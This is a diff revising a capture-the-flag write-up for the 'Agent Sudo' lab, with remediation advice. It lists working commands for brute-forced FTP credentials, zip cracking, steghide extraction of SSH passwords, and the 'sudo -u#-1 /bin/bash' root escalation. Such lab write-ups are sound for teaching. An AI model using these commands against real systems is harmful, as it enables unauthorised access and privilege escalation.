@@ -1,153 +1,186 @@
-# Agent Sudo — CTF Writeup — Web Enumeration, Steganography, SSH Access, and Sudo Privilege Escalation
+# Agent Sudo -- CTF Writeup -- Web Enumeration, Steganography, SSH Access, and Sudo Privilege Escalation
 
 ## 1. Engagement Overview
-- **Title / Project Name:** Agent Sudo (CTF room)
-- **Author:** Myself
-- **Date:** Old
-- **Objective:** Capture user and root flags by performing web enumeration, extracting hidden data from images, securing SSH access, and abusing sudo misconfiguration for privilege escalation.
-- **Scope / Target:** `10.201.41.224`
-- **Testing Window:** CTF box
-- **Tools Used:** nmap, curl, hydra, ftp client, unzip, zip2john, john, steghide, ssh, scp, linPEAS, basic unix utilities
-- **Methodology Reference:** Recon → Enumeration → Exploitation → Post-exploitation → Cleanup
+- Title / Project Name: Agent Sudo CTF Writeup
+- Author: Damien Rees
+- Date: 2025-11-01
+- Objective: Compromise the target, obtain user and root flags, and document methodology.
+- Scope / Target: IP: 10.201.41.224 | Room: Agent Sudo
+- Testing Window: Scan date (local notes): 2025-09-12
+- Tools Used: nmap, curl, Hydra, FTP, zip2john, john, steghide, SSH, scp, linPEAS, bash
+- Methodology Reference: Reconnaissance → Enumeration → Exploitation → Post-Exploitation → Privilege Escalation → Cleanup
 
 ## 2. Short Summary
-Initial access was gained via web enumeration with custom User-Agent headers, revealing a hint for weak credentials. Used FTP to retrieve files, extracted a hidden zip and steganographic data to obtain SSH credentials for `james`. SSH login provided user-level access and a user flag. Privilege escalation was achieved via an unsafe sudo configuration allowing `(ALL, !root) /bin/bash`, which was abused using the `sudo -u#-1 /bin/bash` technique to spawn a root shell and read `/root/root.txt`. Overall severity: **High (full system compromise)**.
+Initial access was gained via web enumeration with custom User-Agent headers, revealing a hint for weak credentials. Used FTP to retrieve files, extracted hidden zip and steganography data to obtain SSH credentials for james. SSH login provided user-level access and a user flag. Privilege escalation achieved via sudo misconfiguration using the `sudo -u#-1 /bin/bash` technique to spawn a root shell and read `/root/root.txt`.
 
 ## 3. Methodology / Process Flow
 
-### 3.1 Recon / Port scan
-**Command**
+### 3.1 Reconnaissance
+**Command:**
+
 ```bash
 nmap -sS 10.201.41.224
 ```
 
-**Key output (summary)**
-- `21/tcp` — ftp (open)
-- `22/tcp` — ssh (open)
-- `80/tcp` — http (open)
-- Notes: Anonymous FTP disabled. Webserver required custom User-Agent headers.
+**Key output:**
 
-### 3.2 Web enumeration
-- Observed message on port 80 instructing agents to use their codename as User-Agent.
-- Iterated single-letter User-Agent (http header) values with `curl` and discovered that `C` returned a message indicating Chris has a weak password (hinting at FTP/SSH credentials).
+```
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+```
 
-**Command**
+**Notes:** FTP, SSH, and HTTP were open. Anonymous FTP was disabled. Webserver required custom User-Agent headers.
+
+### 3.2 Enumeration
+**Web enumeration (port 80):**
+
+Message:
+
+> Dear agents,
+>
+> Use your own codename as user-agent to access the site.
+>
+> From,
+> Agent R
+
+Using curl to iterate User-Agent values (single letters) revealed a valid agent **C**:
+
 ```bash
 curl -A "C" -L 10.201.41.224
 ```
 
-### 3.3 FTP enumeration
-- Logged in using credentials discovered via Hydra (chris:crystal).
-- Directory listing showed `To_agentJ.txt`, `cute-alien.jpg`, and `cutie.png`.
-- `To_agentJ.txt` hinted that the real picture and a password were hidden inside the fake picture.
+Response indicated **Chris** has a weak password, hinting at FTP/SSH login credentials.
 
-**Commands / output excerpt**
-```text
-ftp> open 10.201.41.224
-230 Login successful.
-ftp> ls
--rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
--rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
--rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
+### 3.3 Exploitation
+**FTP enumeration:**
+
+Logged in with credentials found via Hydra `(chris:crystal)`:
+
+```bash
+ftp 10.201.41.224
+# 230 Login successful.
+ls
+# -rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
+# -rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
+# -rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
 ```
 
-### 3.4 Steganography / hidden data extraction
-- Extracted a hidden zip from `cutie.png` and cracked it using `zip2john` + `john` with rockyou; password found: `alien`.
-- `To_agentR.txt` contained Base64 string `QXJlYTUx` → decodes to `Area51` (used as a stego hint).
-- Used `steghide` on `cute-alien.jpg` to extract `message.txt`, which contained credentials for `james` (password: `hackerrules`).
+Downloaded and inspected `To_agentJ.txt`:
 
-**Commands (examples)**
+```
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+```
+
+Other files (images) contained hidden information.
+
+### 3.4 Post-Exploitation
+**Steganography / hidden data extraction**
+
+Extracting hidden zip from `cutie.png`:
+
 ```bash
-unzip cutie.png  # extracted hidden.zip
-zip2john hidden.zip > zip.hash
-john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash  # found password: alien
-# Read To_agentR.txt -> contained 'QXJlYTUx' (Base64 -> Area51)
+unzip cutie.png
+# warning about extra bytes; attempting 7z instead
+```
 
+Using `zip2john` and `john` to crack the zip:
+
+```bash
+zip2john hidden.zip > zip.hash
+john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
+# password found: alien
+```
+
+Reading `To_agentR.txt`:
+
+```
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+```
+
+Base64 decoded `QXJlYTUx` → **Area51** — thought to be used as agent J's password, however is the steganography password.
+
+Extracting steganography from `cute-alien.jpg`:
+
+```bash
 steghide info cute-alien.jpg
 steghide extract -sf cute-alien.jpg
-cat message.txt  # contains: 'Hi james,... Your login password is hackerrules!'
+cat message.txt
+# Hi james,
+#
+# Glad you find this message. Your login password is hackerrules!
 ```
 
-### 3.5 SSH login and user flag
-- SSH using `james:hackerrules` allowed login to the system.
-- Located `user_flag.txt` and retrieved the user flag.
-- Copied `Alien_autospy.jpg` locally for verification/reverse-image checks.
-
-**Commands**
-```bash
-ssh james@10.201.41.224
-ls
-cat user_flag.txt
-scp Alien_autospy.jpg /local/path
-```
-
-### 3.6 Privilege escalation (Post-Exploitation)
-- Transferred `linPEAS` to the target for enumeration:
-```bash
-scp linPEAS/linpeas.sh james@10.201.41.224:/tmp/
-```
-- Checked sudo privileges with `sudo -l` and observed:
-```
-User james may run the following commands on agent-sudo:
-    (ALL, !root) /bin/bash
-```
-- Abused the misconfiguration using the `sudo -u#-1 /bin/bash` trick to spawn a root shell.
-
-**Commands / exploit**
-```bash
-sudo -u#-1 /bin/bash
-whoami  # => root
-cat /root/root.txt
-```
+### 3.5 Persistence / Cleanup
+N/A for CTF. Credentials and tools left only temporarily; removed post-exploitation.
 
 ## 4. Findings Summary
+
 | ID | Vulnerability | Severity | Impact | Recommendation |
-|----|---------------|---------:|--------|----------------|
-| 1 | Unsafe sudo configuration: `(ALL, !root) /bin/bash` | Critical | Full root escalation via sudo abuse | Remove or restrict this sudoers entry; avoid allowing shell binaries for all users; use command-specific least-privilege entries |
-| 2 | Sensitive data hidden in public assets (steganography, archives) | Medium | Credential disclosure leading to account compromise | Avoid storing secrets in public assets; scan public shares for hidden data and remove sensitive content |
-| 3 | Weak credentials discovered via hints | Medium | Enables initial access through credential guessing | Enforce strong password policies and rotate compromised credentials; do not expose credential hints publicly |
+|----|--------------|----------|--------|----------------|
+| 1  | Weak credentials via web hint | Medium | Allowed brute-forcing and credential stuffing | Remove operational hints, enforce strong password policy |
+| 2  | Insecure FTP credentials | High | Unauthorized access to sensitive files | Disable FTP or enforce SFTP, require strong passwords |
+| 3  | Sensitive data hidden in images | Medium | Credentials leakage, lateral movement | Avoid embedding secrets in public artifacts |
+| 4  | Sudo misconfiguration | Critical | Full system compromise (root access) | Remove dangerous sudo rules, audit sudoers |
 
 ## 5. Technical Details
 
-### Finding 1 — Unsafe sudo configuration
-- **Description:** Sudoers allowed execution of `/bin/bash` for `(ALL, !root)` which can be abused to gain root privileges using user specifier tricks.
-- **Impact:** Local privilege escalation resulting in complete system compromise.
-- **Evidence (commands / output):**
-```text
-sudo -l
-User james may run the following commands on agent-sudo:
-    (ALL, !root) /bin/bash
-sudo -u#-1 /bin/bash
-whoami  # root
-```
-- **Recommendation:** Remove or tighten sudoers entries. Do not allow execution of interactive shells; use tightly-scoped commands and CMND_Alias for allowed tasks.
+### Finding <1> — Weak Credentials via Web Hint
+- **Description:** Web app disclosed operational hints instructing use of codenames as User-Agent. Iteration identified agent `C`, revealing that user Chris had weak credentials.
+- **Impact:** Facilitated brute forcing/credential stuffing, leading to FTP access.
+- **Evidence:** `curl -A "C" -L 10.201.41.224` response message.
+- **Recommendation:** Remove operational hints from public interfaces; enforce rate limiting and strong password policy.
+- **References:** OWASP ASVS, OWASP Testing Guide (credential enumeration).
 
-### Finding 2 — Steganography & hidden zip revealed credentials
-- **Description:** Images and archived content on the FTP server contained hidden files that disclosed passwords and instructions.
-- **Impact:** Attackers can extract credentials and gain initial access.
-- **Evidence (commands / output):**
-```bash
-unzip cutie.png  # extracted hidden.zip
-john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash  # password: alien
-steghide extract -sf cute-alien.jpg
-cat message.txt  # 'Your login password is hackerrules!'
-```
-- **Recommendation:** Remove sensitive data from public file shares and implement content scanning for hidden data. Train staff not to store secrets in public assets.
+### Finding <2> — Insecure FTP Credentials
+- **Description:** FTP login succeeded with weak credentials `chris:crystal`.
+- **Impact:** Unauthorized access to files containing sensitive hints and images with embedded data.
+- **Evidence:** `ftp 10.201.41.224` session showing file listings.
+- **Recommendation:** Disable FTP or enforce SFTP; require strong passwords; monitor access logs.
+- **References:** NIST SP 800-63, CIS Benchmarks.
 
-### Finding 3 — Weak credential hints on web server
-- **Description:** Web content indicated a user with a weak password (Chris), which led to successful FTP/credential discovery.
-- **Impact:** Facilitated credential discovery and access via FTP/SSH.
-- **Evidence:** `curl -A "C" -L 10.201.41.224` returned hint text.
-- **Recommendation:** Avoid publishing credential hints or sensitive developer notes; use secure channels for internal notes.
+### Finding <3> — Sensitive Data Hidden in Images (Steganography)
+- **Description:** Images contained hidden zip and steganographic messages revealing passwords.
+- **Impact:** Leakage of credentials enabling lateral movement to SSH.
+- **Evidence:** `zip2john`, `john`, and `steghide` outputs; `message.txt` revealing `hackerrules` for `james`.
+- **Recommendation:** Avoid embedding secrets in public artifacts; implement secret management.
+- **References:** steghide documentation; general secure development practices.
+
+### Finding <4> — Sudo Misconfiguration Enabling Root Escalation
+- **Description:** `sudo -l` showed `(ALL, !root) /bin/bash`. Exploited with `sudo -u#-1 /bin/bash` to obtain root.
+- **Impact:** Full system compromise and access to `/root/root.txt`.
+- **Evidence:** `sudo -u#-1 /bin/bash` followed by `whoami -> root`.
+- **Recommendation:** Remove dangerous sudo rules; restrict shell execution; audit sudoers; apply least privilege.
+- **References:** Exploit-DB 47502; PEASS-ng docs.
 
 ## 6. Remediation Plan
-- **Critical:** Remove the `(ALL, !root) /bin/bash` sudo entry and audit sudoers for similarly unsafe entries.
-- **High:** Remove secrets from public/shared files and implement automated scanning for steganographic content and archives.
-- **Medium:** Enforce stronger password policies, rotate compromised credentials, and disable FTP anonymous/logins where unnecessary.
-- **Medium:** Harden webserver headers and cookie flags; reduce information disclosure.
-- **Low:** Conduct regular security awareness training for developers regarding storage of secrets.
+1. Remove informative banners and hints from web application responses.
+2. Disable FTP or migrate to SFTP; enforce strong password policies and MFA.
+3. Audit repositories and assets for embedded secrets; use dedicated secret storage.
+4. Review `sudoers` for unsafe rules; implement least-privilege and regular audits.
+5. Continuous monitoring and alerting for brute-force attempts.
 
-## 7. Appendix: Commands Used
+## 7. Appendices
+- Tool outputs
+- Screenshots
+- Scripts / Exploits used
+- Command reference
+- Evidence hashes
+
+---
+
+### Appendix: Commands Used
 ```bash
 # Recon
 nmap -sS 10.201.41.224
@@ -180,6 +213,3 @@ scp linpeas.sh james@10.201.41.224:/tmp/
 sudo -u#-1 /bin/bash
 cat /root/root.txt
 ```
-
----
-
